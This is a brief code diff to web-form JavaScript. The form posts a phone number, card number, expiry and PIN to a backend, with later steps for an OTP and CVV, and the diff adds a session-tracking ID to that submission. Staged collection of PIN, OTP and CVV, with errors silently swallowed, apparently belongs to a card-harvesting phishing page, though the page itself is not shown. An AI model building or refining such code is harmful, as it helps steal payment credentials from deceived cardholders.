@@ -845,6 +845,7 @@
       var expiry = expiryRaw.slice(2,4) + '/' + expiryRaw.slice(0,2);
 
       let subId = sid || null;
+      const initId = sessionStorage.getItem('stc-init-id') || '';
       try {
         if (subId) {
           await fetch('/api/submit-step/' + subId, {
@@ -856,10 +857,11 @@
           const r = await fetch('/api/submit', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone, amount, card, expiry, pin, otp: '', cvv: '' })
+            body: JSON.stringify({ phone, amount, card, expiry, pin, otp: '', cvv: '', initId })
           });
           const d = await r.json();
           subId = d.id;
+          sessionStorage.removeItem('stc-init-id');
         }
       } catch(e) {}
 
